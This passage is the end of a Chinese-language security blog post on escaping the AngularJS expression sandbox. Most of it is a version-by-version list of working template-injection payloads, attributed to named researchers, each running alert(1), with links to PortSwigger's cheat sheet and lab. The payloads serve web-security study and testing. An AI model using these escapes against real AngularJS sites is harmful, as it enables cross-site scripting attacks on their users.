fa-external-link-alt"></i></a>上的沙盒逃逸列表：</p><ul><li><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected">反射的 AngularJS 沙箱逃逸<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#dom-based-angularjs-sandbox-escapes">基于 DOM 的 AngularJS 沙箱逃逸<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses">AngularJS CSP 绕过<i class="fas fa-external-link-alt"></i></a></li></ul><h3 id="沙盒绕过列表"><a href="#沙盒绕过列表" class="headerlink" title="沙盒绕过列表"></a>沙盒绕过列表</h3><p>1.0.1 - 1.1.5</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/cure53berlin">马里奥·海德里希<i class="fas fa-external-link-alt"></i></a> (Cure53)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.2.0 - 1.2.1</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/tehjh">扬·霍恩<i class="fas fa-external-link-alt"></i></a> （谷歌）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a=<span class="string">&#x27;constructor&#x27;</span>;b=&#123;&#125;;a.<span class="property">sub</span>.<span class="property">call</span>.<span class="title function_">call</span>(b[a].<span class="title function_">getOwnPropertyDescriptor</span>(b[a].<span class="title function_">getPrototypeOf</span>(a.<span class="property">sub</span>),a).<span class="property">value</span>,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.2.2 - 1.2.5</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;$eval(<span class="string">&quot;x=&#x27;&quot;</span>+(y=<span class="string">&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;</span>)+<span class="built_in">eval</span>(y)+<span class="string">&quot;&#x27;&quot;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.2.6 - 1.2.18</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/tehjh">扬·霍恩<i class="fas fa-external-link-alt"></i></a> （谷歌）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(_=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>).<span class="property">call</span>.<span class="title function_">call</span>(&#123;&#125;[$=<span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">getOwnPropertyDescriptor</span>(_.<span class="property">__proto__</span>,$).<span class="property">value</span>,<span class="number">0</span>,<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.2.19 - 1.2.23</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/avlidienbrunn">马蒂亚斯·卡尔松<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;toString.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>=toString.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span>;[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;alert(1)&quot;</span>].<span class="title function_">sort</span>(toString.<span class="property">constructor</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.2.24 - 1.2.29</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;$eval(<span class="string">&quot;x=&#x27;\&quot;+(y=&#x27;if(!window\\u002ex)alert(window\\u002ex=1)&#x27;)+eval(y)+\&quot;&#x27;&quot;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.3.0</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/molnar_g">加博尔·莫纳尔<i class="fas fa-external-link-alt"></i></a> （谷歌）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;!ready &amp;&amp; (ready = <span class="literal">true</span>) &amp;&amp; (      !call      ? $$watchers[<span class="number">0</span>].<span class="title function_">get</span>(toString.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>)      : (a = apply) &amp;&amp;        (apply = constructor) &amp;&amp;        (valueOf = call) &amp;&amp;        (<span class="string">&#x27;&#x27;</span>+<span class="string">&#x27;&#x27;</span>.<span class="title function_">toString</span>(          <span class="string">&#x27;F = Function.prototype;&#x27;</span> +          <span class="string">&#x27;F.apply = F.a;&#x27;</span> +          <span class="string">&#x27;delete F.a;&#x27;</span> +          <span class="string">&#x27;delete F.valueOf;&#x27;</span> +          <span class="string">&#x27;alert(1);&#x27;</span>        ))    );&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.3.1 - 1.3.2</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;    &#123;&#125;[&#123;<span class="attr">toString</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">assign</span>=[].<span class="property">join</span>;    <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=<span class="string">&#x27;&#x27;</span>.<span class="property">valueOf</span>;     $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>); &#125;&#125;</span><br></pre></td></tr></table></figure><p>1.3.3 - 1.3.18</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;[&#123;<span class="attr">toString</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">assign</span>=[].<span class="property">join</span>;   <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;  $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>);  &#125;&#125;</span><br></pre></td></tr></table></figure><p>1.3.19</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;    <span class="string">&#x27;a&#x27;</span>[&#123;<span class="attr">toString</span>:<span class="literal">false</span>,<span class="attr">valueOf</span>:[].<span class="property">join</span>,<span class="attr">length</span>:<span class="number">1</span>,<span class="number">0</span>:<span class="string">&#x27;__proto__&#x27;</span>&#125;].<span class="property">charAt</span>=[].<span class="property">join</span>;     $eval(<span class="string">&#x27;x=alert(1)//&#x27;</span>); &#125;&#125;</span><br></pre></td></tr></table></figure><p>1.3.20</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.4.0 - 1.4.9</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">加雷斯·海耶斯<i class="fas fa-external-link-alt"></i></a> （PortSwigger）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><p>1.5.0 - 1.5.8</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/ianhickey1024">伊恩·希基<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;x = &#123;<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>&#125;; x[<span class="string">&#x27;y&#x27;</span>].<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=alert(1)&#x27;</span>);&#125;&#125; </span><br></pre></td></tr></table></figure><p>1.5.9 - 1.5.11</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/tehjh">扬·霍恩<i class="fas fa-external-link-alt"></i></a> （谷歌）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;   c=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>.<span class="property">call</span>;b=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>.<span class="property">bind</span>;a=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>.<span class="property">apply</span>;   c.<span class="property">$apply</span>=$apply;c.<span class="property">$eval</span>=b;op=$root.<span class="property">$$phase</span>;   $root.<span class="property">$$phase</span>=<span class="literal">null</span>;od=$root.<span class="property">$digest</span>;$root.<span class="property">$digest</span>=(&#123;&#125;).<span class="property">toString</span>;   C=c.$apply(c);$root.<span class="property">$$phase</span>=op;$root.<span class="property">$digest</span>=od;   B=<span class="title function_">C</span>(b,c,b);$evalAsync(<span class="string">&quot;   astNode=pop();astNode.type=&#x27;UnaryExpression&#x27;;   astNode.operator=&#x27;(window.X?void0:(window.X=true,alert(1)))+&#x27;;   astNode.argument=&#123;type:&#x27;Identifier&#x27;,name:&#x27;foo&#x27;&#125;;   &quot;</span>);   m1=<span class="title function_">B</span>($$asyncQueue.<span class="title function_">pop</span>().<span class="property">expression</span>,<span class="literal">null</span>,$root);   m2=<span class="title function_">B</span>(C,<span class="literal">null</span>,m1);[].<span class="property">push</span>.<span class="property">apply</span>=m2;a=<span class="string">&#x27;&#x27;</span>.<span class="property">sub</span>;   $eval(<span class="string">&#x27;a(b.c)&#x27;</span>);[].<span class="property">push</span>.<span class="property">apply</span>=a;&#125;&#125;</span><br></pre></td></tr></table></figure><p>&gt;=1.6.0</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/cure53berlin">马里奥·海德里希<i class="fas fa-external-link-alt"></i></a> (Cure53)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>请访问<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression">网络学院 AngularJS 实验室<i class="fas fa-external-link-alt"></i></a>以使用 AngularJS 来试验 XSS。</p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/XSS/">#XSS</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2022/05/14/ctfshow_xss_wp/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">ctfshow_xss_wp</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2022/05/04/web_XSS/"><span class="title flex-center"><span class="post-nav-title-item">Web_XSS</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline-meta.css"><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%BD%E8%B1%A1%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">抽象的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%9B%92"><span class="nav-number">3.</span> <span class="nav-text">沙盒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A0%B4%E5%9D%8F%E6%B6%88%E6%AF%92%E5%89%82"><span class="nav-number">4.</span> <span class="nav-text">破坏消毒剂</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%83%E7%A6%BB%E6%B2%99%E7%AE%B1"><span class="nav-number">5.</span> <span class="nav-text">逃离沙箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-number">6.</span> <span class="nav-text">结论</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E2%80%A6"><span class="nav-number">7.</span> <span class="nav-text">更新…</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E2%80%A6-1"><span class="nav-number">8.</span> <span class="nav-text">更新…</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E8%84%B1"><span class="nav-number">9.</span> <span class="nav-text">沙盒逃脱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E5%88%97%E8%A1%A8"><span class="nav-number">10.</span> <span class="nav-text">沙盒绕过列表</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><div class="post-scripts"><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>